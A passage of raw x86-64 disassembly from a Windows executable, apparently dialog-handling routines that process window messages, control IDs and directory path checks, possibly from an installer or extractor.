   140003405:	74 27                	je     0x14000342e
   140003407:	81 ea 00 01 00 00    	sub    $0x100,%edx
   14000340d:	74 32                	je     0x140003441
   14000340f:	83 fa 01             	cmp    $0x1,%edx
   140003412:	0f 85 08 01 00 00    	jne    0x140003520
   140003418:	49 83 f8 06          	cmp    $0x6,%r8
   14000341c:	75 06                	jne    0x140003424
   14000341e:	41 8d 50 fb          	lea    -0x5(%r8),%edx
   140003422:	eb 0c                	jmp    0x140003430
   140003424:	49 83 f8 07          	cmp    $0x7,%r8
   140003428:	0f 85 b7 00 00 00    	jne    0x1400034e5
   14000342e:	33 d2                	xor    %edx,%edx
   140003430:	48 ff 15 09 61 00 00 	rex.W call *0x6109(%rip)        # 0x140009540
   140003437:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   14000343c:	e9 a4 00 00 00       	jmp    0x1400034e5
   140003441:	48 ff 15 20 61 00 00 	rex.W call *0x6120(%rip)        # 0x140009568
   140003448:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   14000344d:	48 8b d0             	mov    %rax,%rdx
   140003450:	48 8b cb             	mov    %rbx,%rcx
   140003453:	e8 10 18 00 00       	call   0x140004c68
   140003458:	4c 8b 05 d1 9b 00 00 	mov    0x9bd1(%rip),%r8        # 0x14000d030
   14000345f:	ba 34 08 00 00       	mov    $0x834,%edx
   140003464:	48 8b cb             	mov    %rbx,%rcx
   140003467:	48 ff 15 ea 60 00 00 	rex.W call *0x60ea(%rip)        # 0x140009558
   14000346e:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140003473:	48 8d 15 fe a0 00 00 	lea    0xa0fe(%rip),%rdx        # 0x14000d578
   14000347a:	48 8b cb             	mov    %rbx,%rcx
   14000347d:	48 ff 15 4c 60 00 00 	rex.W call *0x604c(%rip)        # 0x1400094d0
   140003484:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140003489:	48 8b cb             	mov    %rbx,%rcx
   14000348c:	48 ff 15 7d 60 00 00 	rex.W call *0x607d(%rip)        # 0x140009510
   140003493:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140003498:	ba 34 08 00 00       	mov    $0x834,%edx
   14000349d:	48 8b cb             	mov    %rbx,%rcx
   1400034a0:	48 ff 15 49 60 00 00 	rex.W call *0x6049(%rip)        # 0x1400094f0
   1400034a7:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400034ac:	48 8b c8             	mov    %rax,%rcx
   1400034af:	ba fc ff ff ff       	mov    $0xfffffffc,%edx
   1400034b4:	48 8b d8             	mov    %rax,%rbx
   1400034b7:	48 ff 15 42 60 00 00 	rex.W call *0x6042(%rip)        # 0x140009500
   1400034be:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400034c3:	4c 8d 05 d6 fe ff ff 	lea    -0x12a(%rip),%r8        # 0x1400033a0
   1400034ca:	ba fc ff ff ff       	mov    $0xfffffffc,%edx
   1400034cf:	48 8b cb             	mov    %rbx,%rcx
   1400034d2:	48 89 05 b7 96 00 00 	mov    %rax,0x96b7(%rip)        # 0x14000cb90
   1400034d9:	48 ff 15 28 60 00 00 	rex.W call *0x6028(%rip)        # 0x140009508
   1400034e0:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400034e5:	b8 01 00 00 00       	mov    $0x1,%eax
   1400034ea:	eb 36                	jmp    0x140003522
   1400034ec:	83 3d 4d 93 00 00 00 	cmpl   $0x0,0x934d(%rip)        # 0x14000c840
   1400034f3:	75 2b                	jne    0x140003520
   1400034f5:	48 83 64 24 20 00    	andq   $0x0,0x20(%rsp)
   1400034fb:	49 83 c9 ff          	or     $0xffffffffffffffff,%r9
   1400034ff:	ba 34 08 00 00       	mov    $0x834,%edx
   140003504:	41 b8 b1 00 00 00    	mov    $0xb1,%r8d
   14000350a:	48 ff 15 cf 5f 00 00 	rex.W call *0x5fcf(%rip)        # 0x1400094e0
   140003511:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140003516:	c7 05 20 93 00 00 01 	movl   $0x1,0x9320(%rip)        # 0x14000c840
   14000351d:	00 00 00 
   140003520:	33 c0                	xor    %eax,%eax
   140003522:	48 83 c4 30          	add    $0x30,%rsp
   140003526:	5b                   	pop    %rbx
   140003527:	c3                   	ret
   140003528:	cc                   	int3
   140003529:	cc                   	int3
   14000352a:	cc                   	int3
   14000352b:	cc                   	int3
   14000352c:	cc                   	int3
   14000352d:	cc                   	int3
   14000352e:	cc                   	int3
   14000352f:	cc                   	int3
   140003530:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   140003535:	48 89 6c 24 18       	mov    %rbp,0x18(%rsp)
   14000353a:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   14000353f:	41 57                	push   %r15
   140003541:	48 83 ec 30          	sub    $0x30,%rsp
   140003545:	41 bf 10 00 00 00    	mov    $0x10,%r15d
   14000354b:	48 8b f9             	mov    %rcx,%rdi
   14000354e:	41 2b d7             	sub    %r15d,%edx
   140003551:	0f 84 ab 02 00 00    	je     0x140003802
   140003557:	41 8d 5f f1          	lea    -0xf(%r15),%ebx
   14000355b:	81 ea 00 01 00 00    	sub    $0x100,%edx
   140003561:	0f 84 17 02 00 00    	je     0x14000377e
   140003567:	3b d3                	cmp    %ebx,%edx
   140003569:	74 07                	je     0x140003572
   14000356b:	33 c0                	xor    %eax,%eax
   14000356d:	e9 a3 02 00 00       	jmp    0x140003815
   140003572:	4c 2b c3             	sub    %rbx,%r8
   140003575:	0f 84 ba 00 00 00    	je     0x140003635
   14000357b:	4c 2b c3             	sub    %rbx,%r8
   14000357e:	0f 84 94 00 00 00    	je     0x140003618
   140003584:	49 81 f8 34 08 00 00 	cmp    $0x834,%r8
   14000358b:	0f 85 6c 02 00 00    	jne    0x1400037fd
   140003591:	48 8b 0d d8 a8 00 00 	mov    0xa8d8(%rip),%rcx        # 0x14000de70
   140003598:	4c 8d 05 b1 92 00 00 	lea    0x92b1(%rip),%r8        # 0x14000c850
   14000359f:	41 b9 00 02 00 00    	mov    $0x200,%r9d
   1400035a5:	ba e8 03 00 00       	mov    $0x3e8,%edx
   1400035aa:	48 ff 15 7f 5f 00 00 	rex.W call *0x5f7f(%rip)        # 0x140009530
   1400035b1:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400035b6:	48 8b cf             	mov    %rdi,%rcx
   1400035b9:	85 c0                	test   %eax,%eax
   1400035bb:	75 21                	jne    0x1400035de
   1400035bd:	ba b1 04 00 00       	mov    $0x4b1,%edx
   1400035c2:	83 64 24 28 00       	andl   $0x0,0x28(%rsp)
   1400035c7:	45 33 c9             	xor    %r9d,%r9d
   1400035ca:	45 33 c0             	xor    %r8d,%r8d
   1400035cd:	44 89 7c 24 20       	mov    %r15d,0x20(%rsp)
   1400035d2:	e8 f5 17 00 00       	call   0x140004dcc
   1400035d7:	33 d2                	xor    %edx,%edx
   1400035d9:	e9 6d 01 00 00       	jmp    0x14000374b
   1400035de:	e8 7d 14 00 00       	call   0x140004a60
   1400035e3:	85 c0                	test   %eax,%eax
   1400035e5:	0f 84 12 02 00 00    	je     0x1400037fd
   1400035eb:	4c 8d 05 6e 94 00 00 	lea    0x946e(%rip),%r8        # 0x14000ca60
   1400035f2:	ba 35 08 00 00       	mov    $0x835,%edx
   1400035f7:	48 8b cf             	mov    %rdi,%rcx
   1400035fa:	48 ff 15 57 5f 00 00 	rex.W call *0x5f57(%rip)        # 0x140009558
   140003601:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140003606:	85 c0                	test   %eax,%eax
   140003608:	0f 85 ef 01 00 00    	jne    0x1400037fd
   14000360e:	ba c0 04 00 00       	mov    $0x4c0,%edx
   140003613:	48 8b cf             	mov    %rdi,%rcx
   140003616:	eb aa                	jmp    0x1400035c2
   140003618:	33 d2                	xor    %edx,%edx
   14000361a:	48 ff 15 1f 5f 00 00 	rex.W call *0x5f1f(%rip)        # 0x140009540
   140003621:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140003626:	c7 05 14 9f 00 00 c7 	movl   $0x800704c7,0x9f14(%rip)        # 0x14000d544
   14000362d:	04 07 80 
   140003630:	e9 c8 01 00 00       	jmp    0x1400037fd
   140003635:	48 8d 2d d4 9f 00 00 	lea    0x9fd4(%rip),%rbp        # 0x14000d610
   14000363c:	41 b9 04 01 00 00    	mov    $0x104,%r9d
   140003642:	4c 8b c5             	mov    %rbp,%r8
   140003645:	ba 35 08 00 00       	mov    $0x835,%edx
   14000364a:	48 ff 15 27 5f 00 00 	rex.W call *0x5f27(%rip)        # 0x140009578
   140003651:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140003656:	85 c0                	test   %eax,%eax
   140003658:	0f 84 01 01 00 00    	je     0x14000375f
   14000365e:	48 83 c8 ff          	or     $0xffffffffffffffff,%rax
   140003662:	48 ff c0             	inc    %rax
   140003665:	80 3c 28 00          	cmpb   $0x0,(%rax,%rbp,1)
   140003669:	75 f7                	jne    0x140003662
   14000366b:	48 83 f8 03          	cmp    $0x3,%rax
   14000366f:	0f 82 ea 00 00 00    	jb     0x14000375f
   140003675:	8a 05 96 9f 00 00    	mov    0x9f96(%rip),%al        # 0x14000d611
   14000367b:	3c 3a                	cmp    $0x3a,%al
   14000367d:	74 15                	je     0x140003694
   14000367f:	80 3d 8a 9f 00 00 5c 	cmpb   $0x5c,0x9f8a(%rip)        # 0x14000d610
   140003686:	0f 85 d3 00 00 00    	jne    0x14000375f
   14000368c:	3c 5c                	cmp    $0x5c,%al
   14000368e:	0f 85 cb 00 00 00    	jne    0x14000375f
   140003694:	48 8b cd             	mov    %rbp,%rcx
   140003697:	48 ff 15 6a 5b 00 00 	rex.W call *0x5b6a(%rip)        # 0x140009208
   14000369e:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400036a3:	83 f8 ff             	cmp    $0xffffffff,%eax
   1400036a6:	75 52                	jne    0x1400036fa
   1400036a8:	c7 44 24 28 04 00 00 	movl   $0x4,0x28(%rsp)
   1400036af:	00 
   1400036b0:	45 33 c9             	xor    %r9d,%r9d
   1400036b3:	4c 8b c5             	mov    %rbp,%r8
   1400036b6:	c7 44 24 20 20 00 00 	movl   $0x20,0x20(%rsp)
   1400036bd:	00 
   1400036be:	ba 4a 05 00 00       	mov    $0x54a,%edx
   1400036c3:	48 8b cf             	mov    %rdi,%rcx
   1400036c6:	e8 01 17 00 00       	call   0x140004dcc
   1400036cb:	83 f8 06             	cmp    $0x6,%eax
   1400036ce:	0f 85 29 01 00 00    	jne    0x1400037fd
   1400036d4:	33 d2                	xor    %edx,%edx
   1400036d6:	48 8b cd             	mov    %rbp,%rcx
   1400036d9:	48 ff 15 b0 5b 00 00 	rex.W call *0x5bb0(%rip)        # 0x140009290
   1400036e0:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400036e5:	85 c0                	test   %eax,%eax
   1400036e7:	75 11                	jne    0x1400036fa
   1400036e9:	21 44 24 28          	and    %eax,0x28(%rsp)
   1400036ed:	4c 8b c5             	mov    %rbp,%r8
   1400036f0:	45 33 c9             	xor    %r9d,%r9d
   1400036f3:	ba cb 04 00 00       	mov    $0x4cb,%edx
   1400036f8:	eb 75                	jmp    0x14000376f
   1400036fa:	4c 8d 05 ff 5f 00 00 	lea    0x5fff(%rip),%r8        # 0x140009700
   140003701:	ba 04 01 00 00       	mov    $0x104,%edx
   140003706:	48 8b cd             	mov    %rbp,%rcx
   140003709:	e8 9a 44 00 00       	call   0x140007ba8
   14000370e:	48 8b cd             	mov    %rbp,%rcx
   140003711:	e8 5a 34 00 00       	call   0x140006b70
   140003716:	85 c0                	test   %eax,%eax
   140003718:	75 07                	jne    0x140003721
   14000371a:	ba be 04 00 00       	mov    $0x4be,%edx
   14000371f:	eb 43                	jmp    0x140003764
   140003721:	80 3d e8 9e 00 00 5c 	cmpb   $0x5c,0x9ee8(%rip)        # 0x14000d610
   140003728:	75 09                	jne    0x140003733
   14000372a:	80 3d e0 9e 00 00 5c 	cmpb   $0x5c,0x9ee0(%rip)        # 0x14000d611
   140003731:	74 15                	je     0x140003748
   140003733:	44 8b c3             	mov    %ebx,%r8d
   140003736:	8b d3                	mov    %ebx,%edx
   140003738:	48 8b cd             	mov    %rbp,%rcx
   14000373b:	e8 64 35 00 00       	call   0x140006ca4
   140003740:	85 c0                	test   %eax,%eax
   140003742:	0f 84 b5 00 00 00    	je     0x1400037fd
   140003748:	48 8b d3             	mov    %rbx,%rdx
   14000374b:	48 8b cf             	mov    %rdi,%rcx
   14000374e:	48 ff 15 eb 5d 00 00 	rex.W call *0x5deb(%rip)        # 0x140009540
   140003755:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   14000375a:	e9 9e 00 00 00       	jmp    0x1400037fd
   14000375f:	ba bf 04 00 00       	mov    $0x4bf,%edx
   140003764:	83 64 24 28 00       	andl   $0x0,0x28(%rsp)
   140003769:	45 33 c9             	xor    %r9d,%r9d
   14000376c:	45 33 c0             	xor    %r8d,%r8d
   14000376f:	48 8b cf             	mov    %rdi,%rcx
   140003772:	44 89 7c 24 20       	mov    %r15d,0x20(%rsp)
   140003777:	e8 50 16 00 00       	call   0x140004dcc
   14000377c:	eb 7f                	jmp    0x1400037fd
   14000377e:	48 ff 15 e3 5d 00 00 	rex.W call *0x5de3(%rip)        # 0x140009568
   140003785:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   14000378a:	48 8b d0             	mov    %rax,%rdx
   14000378d:	48 8b cf             	mov    %rdi,%rcx
   140003790:	e8 d3 14 00 00       	call   0x140004c68
   140003795:	48 8d 15 dc 9d 00 00 	lea    0x9ddc(%rip),%rdx        # 0x14000d578
   14000379c:	48 8b cf             	mov    %rdi,%rcx
   14000379f:	48 ff 15 2a 5d 00 00 	rex.W call *0x5d2a(%rip)        # 0x1400094d0
   1400037a6:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400037ab:	48 83 64 24 20 00    	andq   $0x0,0x20(%rsp)
   1400037b1:	41 b9 03 01 00 00    	mov    $0x103,%r9d
   1400037b7:	ba 35 08 00 00       	mov    $0x835,%edx
   1400037bc:	48 8b cf             	mov    %rdi,%rcx
   1400037bf:	45 8d 41 c2          	lea    -0x3e(%r9),%r8d
   1400037c3:	48 ff 15 16 5d 00 00 	rex.W call *0x5d16(%rip)        # 0x1400094e0
   1400037ca:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400037cf:	66 39 1d a2 a6 00 00 	cmp    %bx,0xa6a2(%rip)        # 0x14000de78
   1400037d6:	75 25                	jne    0x1400037fd
   1400037d8:	ba 36 08 00 00       	mov    $0x836,%edx
   1400037dd:	48 8b cf             	mov    %rdi,%rcx
   1400037e0:	48 ff 15 09 5d 00 00 	rex.W call *0x5d09(%rip)        # 0x1400094f0
   1400037e7:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400037ec:	48 8b c8             	mov    %rax,%rcx
   1400037ef:	33 d2                	xor    %edx,%edx
   1400037f1:	48 ff 15 28 5d 00 00 	rex.W call *0x5d28(%rip)        # 0x140009520
   1400037f8:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400037fd:	48 8b c3             	mov    %rbx,%rax
   140003800:	eb 13                	jmp    0x140003815
   140003802:	33 d2                	xor    %edx,%edx
   140003804:	48 ff 15 35 5d 00 00 	rex.W call *0x5d35(%rip)        # 0x140009540
   14000380b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140003810:	b8 01 00 00 00       	mov    $0x1,%eax
   140003815:	48 8b 5c 24 48       	mov    0x48(%rsp),%rbx
   14000381a:	48 8b 6c 24 50       	mov    0x50(%rsp),%rbp
   14000381f:	48 8b 7c 24 58       	mov    0x58(%rsp),%rdi
   140003824:	48 83 c4 30          	add    $0x30,%rsp
   140003828:	41 5f                	pop    %r15
   14000382a:	c3                   	ret
   14000382b:	cc                   	int3
   14000382c:	cc                   	int3
   14000382d:	cc                   	int3
   14000382e:	cc                   	int3
   14000382f:	cc                   	int3
   140003830:	cc                   	int3
   140003831:	cc                   	int3
   140003832:	cc                   	int3
   140003833:	cc                   	int3
   140003834:	cc                   	int3
   140003835:	cc                   	int3
   140003836:	cc                   	int3
   140003837:	cc                   	int3
   140003838:	cc                   	int3
   140003839:	cc                   	int3
   14000383a:	cc                   	int3
   14000383b:	cc                   	int3
   14000383c:	cc                   	int3
   14000383d:	cc                   	int3
   14000383e:	cc                   	int3
   14000383f:	cc                   	int3
   140003840:	40 53                	rex push %rbx
   140003842:	48 83 ec 20          	sub    $0x20,%rsp
   140003846:	48 8b d9             	mov    %rcx,%rbx
   140003849:	83 ea 10             	sub    $0x10,%edx
   14000384c:	0f 84 95 00 00 00    	je     0x1400038e7
   140003852:	81 ea 00 01 00 00    	sub    $0x100,%edx
   140003858:	74 34                	je     0x14000388e
   14000385a:	83 fa 01             	cmp    $0x1,%edx
   14000385d:	74 07                	je     0x140003866
   14000385f:	33 c0                	xor    %eax,%eax
   140003861:	e9 97 00 00 00       	jmp    0x1400038fd
   140003866:	49 83 f8 06          	cmp    $0x6,%r8
   14000386a:	0f 82 88 00 00 00    	jb     0x1400038f8
   140003870:	49 83 f8 07          	cmp    $0x7,%r8
   140003874:	76 13                	jbe    0x140003889
   140003876:	49 81 f8 39 08 00 00 	cmp    $0x839,%r8
   14000387d:	75 79                	jne    0x1400038f8
   14000387f:	c7 05 77 9d 00 00 01 	movl   $0x1,0x9d77(%rip)        # 0x14000d600
   140003886:	00 00 00 
   140003889:	49 8b d0             	mov    %r8,%rdx
   14000388c:	eb 5e                	jmp    0x1400038ec
   14000388e:	48 ff 15 d3 5c 00 00 	rex.W call *0x5cd3(%rip)        # 0x140009568
   140003895:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   14000389a:	48 8b d0             	mov    %rax,%rdx
   14000389d:	48 8b cb             	mov    %rbx,%rcx
   1400038a0:	e8 c3 13 00 00       	call   0x140004c68
   1400038a5:	48 8d 15 cc 9c 00 00 	lea    0x9ccc(%rip),%rdx        # 0x14000d578
   1400038ac:	48 8b cb             	mov    %rbx,%rcx
   1400038af:	48 ff 15 1a 5c 00 00 	rex.W call *0x5c1a(%rip)        # 0x1400094d0
   1400038b6:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400038bb:	4c 8b 05 6e 9f 00 00 	mov    0x9f6e(%rip),%r8        # 0x14000d830
   1400038c2:	ba 38 08 00 00       	mov    $0x838,%edx
   1400038c7:	48 8b cb             	mov    %rbx,%rcx
   1400038ca:	48 ff 15 87 5c 00 00 	rex.W call *0x5c87(%rip)        # 0x140009558
   1400038d1:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400038d6:	48 8b cb             	mov    %rbx,%rcx
   1400038d9:	48 ff 15 30 5c 00 00 	rex.W call *0x5c30(%rip)        # 0x140009510
   1400038e0:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400038e5:	eb 11                	jmp    0x1400038f8
   1400038e7:	ba 02 00 00 00       	mov    $0x2,%edx
   1400038ec:	48 ff 15 4d 5c 00 00 	rex.W call *0x5c4d(%rip)        # 0x140009540
   1400038f3:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400038f8:	b8 01 00 00 00       	mov    $0x1,%eax
   1400038fd:	48 83 c4 20          	add    $0x20,%rsp
   140003901:	5b                   	pop    %rbx
   140003902:	c3                   	ret
   140003903:	cc                   	int3
   140003904:	cc                   	int3
   140003905:	cc                   	int3
   140003906:	cc                   	int3
   140003907:	cc                   	int3
   140003908:	cc                   	int3
   140003909:	cc                   	int3
   14000390a:	cc                   	int3
   14000390b:	cc                   	int3
   14000390c:	cc                   	int3
   14000390d:	cc                   	int3
   14000390e:	cc                   	int3
   14000390f:	cc                   	int3
   140003910:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140003915:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   14000391a:	57                   	push   %rdi
   14000391b:	48 83 ec 30          	sub    $0x30,%rsp
   14000391f:	49 8b f0             	mov    %r8,%rsi
   140003922:	48 8b f9             	mov    %rcx,%rdi
   140003925:	bb 01 00 00 00       	mov    $0x1,%ebx
   14000392a:	83 ea 10             	sub    $0x10,%edx
   14000392d:	0f 84 df 01 00 00    	je     0x140003b12
   140003933:	81 ea f2 00 00 00    	sub    $0xf2,%edx
   140003939:	0f 84 cd 01 00 00    	je     0x140003b0c
   14000393f:	83 ea 0e             	sub    $0xe,%edx
   140003942:	0f 84 c9 00 00 00    	je     0x140003a11
   140003948:	2b d3                	sub    %ebx,%edx
   14000394a:	74 2f                	je     0x14000397b
   14000394c:	81 fa 90 0e 00 00    	cmp    $0xe90,%edx
   140003952:	74 07                	je     0x14000395b
   140003954:	33 c0                	xor    %eax,%eax
   140003956:	e9 ce 01 00 00       	jmp    0x140003b29
   14000395b:	48 8b 0d f6 90 00 00 	mov    0x90f6(%rip),%rcx        # 0x14000ca58
   140003962:	33 d2                	xor    %edx,%edx
   140003964:	48 ff 15 dd 59 00 00 	rex.W call *0x59dd(%rip)        # 0x140009348
   14000396b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140003970:	48 63 d6             	movslq %esi,%rdx
   140003973:	48 8b cf             	mov    %rdi,%rcx
   140003976:	e9 9f 01 00 00       	jmp    0x140003b1a
   14000397b:	48 83 fe 02          	cmp    $0x2,%rsi
   14000397f:	0f 85 a1 01 00 00    	jne    0x140003b26
   140003985:	48 8b 0d ac 8e 00 00 	mov    0x8eac(%rip),%rcx        # 0x14000c838
   14000398c:	48 ff 15 dd 59 00 00 	rex.W call *0x59dd(%rip)        # 0x140009370
   140003993:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140003998:	48 8b 0d 89 8e 00 00 	mov    0x8e89(%rip),%rcx        # 0x14000c828
   14000399f:	4c 8d 05 5a 5d 00 00 	lea    0x5d5a(%rip),%r8        # 0x140009700
   1400039a6:	45 33 c9             	xor    %r9d,%r9d
   1400039a9:	c7 44 24 28 04 00 00 	movl   $0x4,0x28(%rsp)
   1400039b0:	00 
   1400039b1:	ba b2 04 00 00       	mov    $0x4b2,%edx
   1400039b6:	c7 44 24 20 20 00 00 	movl   $0x20,0x20(%rsp)
   1400039bd:	00 
   1400039be:	e8 09 14 00 00       	call   0x140004dcc
   1400039c3:	83 f8 06             	cmp    $0x6,%eax
   1400039c6:	74 1c                	je     0x1400039e4
   1400039c8:	3b c3                	cmp    %ebx,%eax
   1400039ca:	74 18                	je     0x1400039e4
   1400039cc:	48 8b 0d 65 8e 00 00 	mov    0x8e65(%rip),%rcx        # 0x14000c838
   1400039d3:	48 ff 15 66 59 00 00 	rex.W call *0x5966(%rip)        # 0x140009340
   1400039da:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400039df:	e9 42 01 00 00       	jmp    0x140003b26
   1400039e4:	48 8b 0d 4d 8e 00 00 	mov    0x8e4d(%rip),%rcx        # 0x14000c838
   1400039eb:	89 1d 0b 9c 00 00    	mov    %ebx,0x9c0b(%rip)        # 0x14000d5fc
   1400039f1:	48 ff 15 48 59 00 00 	rex.W call *0x5948(%rip)        # 0x140009340
   1400039f8:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400039fd:	48 8b 0d 54 90 00 00 	mov    0x9054(%rip),%rcx        # 0x14000ca58
   140003a04:	e8 37 01 00 00       	call   0x140003b40
   140003a09:	48 8b cf             	mov    %rdi,%rcx
   140003a0c:	e9 07 01 00 00       	jmp    0x140003b18
   140003a11:	48 89 3d 10 8e 00 00 	mov    %rdi,0x8e10(%rip)        # 0x14000c828
   140003a18:	48 ff 15 49 5b 00 00 	rex.W call *0x5b49(%rip)        # 0x140009568
   140003a1f:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140003a24:	48 8b d0             	mov    %rax,%rdx
   140003a27:	48 8b cf             	mov    %rdi,%rcx
   140003a2a:	e8 39 12 00 00       	call   0x140004c68
   140003a2f:	83 3d 76 87 00 00 00 	cmpl   $0x0,0x8776(%rip)        # 0x14000c1ac
   140003a36:	74 63                	je     0x140003a9b
   140003a38:	be 3b 08 00 00       	mov    $0x83b,%esi
   140003a3d:	48 8b cf             	mov    %rdi,%rcx
   140003a40:	8b d6                	mov    %esi,%edx
   140003a42:	48 ff 15 a7 5a 00 00 	rex.W call *0x5aa7(%rip)        # 0x1400094f0
   140003a49:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140003a4e:	41 b9 b9 0b 00 00    	mov    $0xbb9,%r9d
   140003a54:	45 33 c0             	xor    %r8d,%r8d
   140003a57:	48 8b c8             	mov    %rax,%rcx
   140003a5a:	ba 64 04 00 00       	mov    $0x464,%edx
   140003a5f:	48 ff 15 82 5a 00 00 	rex.W call *0x5a82(%rip)        # 0x1400094e8
   140003a66:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140003a6b:	8b d6                	mov    %esi,%edx
   140003a6d:	48 8b cf             	mov    %rdi,%rcx
   140003a70:	48 ff 15 79 5a 00 00 	rex.W call *0x5a79(%rip)        # 0x1400094f0
   140003a77:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140003a7c:	49 c7 c1 00 00 ff ff 	mov    $0xffffffffffff0000,%r9
   140003a83:	49 83 c8 ff          	or     $0xffffffffffffffff,%r8
   140003a87:	48 8b c8             	mov    %rax,%rcx
   140003a8a:	ba 65 04 00 00       	mov    $0x465,%edx
   140003a8f:	48 ff 15 52 5a 00 00 	rex.W call *0x5a52(%rip)        # 0x1400094e8
   140003a96:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140003a9b:	48 8d 15 d6 9a 00 00 	lea    0x9ad6(%rip),%rdx        # 0x14000d578
   140003aa2:	48 8b cf             	mov    %rdi,%rcx
   140003aa5:	48 ff 15 24 5a 00 00 	rex.W call *0x5a24(%rip)        # 0x1400094d0
   140003aac:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140003ab1:	48 8d 05 98 8f 00 00 	lea    0x8f98(%rip),%rax        # 0x14000ca50
   140003ab8:	45 33 c9             	xor    %r9d,%r9d
   140003abb:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   140003ac0:	4c 8d 05 c9 22 00 00 	lea    0x22c9(%rip),%r8        # 0x140005d90
   140003ac7:	83 64 24 20 00       	andl   $0x0,0x20(%rsp)
   140003acc:	33 d2                	xor    %edx,%edx
   140003ace:	33 c9                	xor    %ecx,%ecx
   140003ad0:	48 ff 15 91 58 00 00 	rex.W call *0x5891(%rip)        # 0x140009368
   140003ad7:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140003adc:	48 89 05 75 8f 00 00 	mov    %rax,0x8f75(%rip)        # 0x14000ca58
   140003ae3:	48 85 c0             	test   %rax,%rax
   140003ae6:	75 3e                	jne    0x140003b26
   140003ae8:	21 44 24 28          	and    %eax,0x28(%rsp)
   140003aec:	45 33 c9             	xor    %r9d,%r9d
   140003aef:	45 33 c0             	xor    %r8d,%r8d
   140003af2:	c7 44 24 20 10 00 00 	movl   $0x10,0x20(%rsp)
   140003af9:	00 
   140003afa:	ba b8 04 00 00       	mov    $0x4b8,%edx
   140003aff:	48 8b cf             	mov    %rdi,%rcx
   140003b02:	e8 c5 12 00 00       	call   0x140004dcc
   140003b07:	e9 fd fe ff ff       	jmp    0x140003a09
   140003b0c:	48 83 fe 1b          	cmp    $0x1b,%rsi
   140003b10:	75 14                	jne    0x140003b26
   140003b12:	89 1d e4 9a 00 00    	mov    %ebx,0x9ae4(%rip)        # 0x14000d5fc
   140003b18:	33 d2                	xor    %edx,%edx
   140003b1a:	48 ff 15 1f 5a 00 00 	rex.W call *0x5a1f(%rip)        # 0x140009540
   140003b21:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140003b26:	48 8b c3             	mov    %rbx,%rax
   140003b29:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   140003b2e:	48 8b 74 24 48       	mov    0x48(%rsp),%rsi
   140003b33:	48 83 c4 30          	add    $0x30,%rsp
   140003b37:	5f                   	pop    %rdi
   140003b38:	c3                   	ret
   140003b39:	cc                   	int3
   140003b3a:	cc                   	int3
   140003b3b:	cc                   	int3
   140003b3c:	cc                   	int3
   140003b3d:	cc                   	int3
   140003b3e:	cc                   	int3
   140003b3f:	cc                   	int3
   140003b40:	48 89 4c 24 08       	mov    %rcx,0x8(%rsp)
   140003b45:	53                   	push   %rbx
   140003b46:	48 83 ec 60          	sub    $0x60,%rsp
   140003b4a:	33 db                	xor    %ebx,%ebx
   140003b4c:	45 33 c0             	xor    %r8d,%r8d
   140003b4f:	c7 44 24 20 ff 04 00 	movl   $0x4ff,0x20(%rsp)
   140003b56:	00 
   140003b57:	41 83 c9 ff          	or     $0xffffffff,%r9d
   140003b5b:	48 8d 54 24 70       	lea    0x70(%rsp),%rdx
   140003b60:	41 8d 48 01          	lea    0x1(%r8),%ecx
   140003b64:	48 ff 15 2d 59 00 00 	rex.W call *0x592d(%rip)        # 0x140009498
   140003b6b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140003b70:	85 c0                	test   %eax,%eax
   140003b72:	74 71                	je     0x140003be5
   140003b74:	45 33 c9             	xor    %r9d,%r9d
   140003b77:	c7 44 24 20 01 00 00 	movl   $0x1,0x20(%rsp)
   140003b7e:	00 
   140003b7f:	45 33 c0             	xor    %r8d,%r8d
   140003b82:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
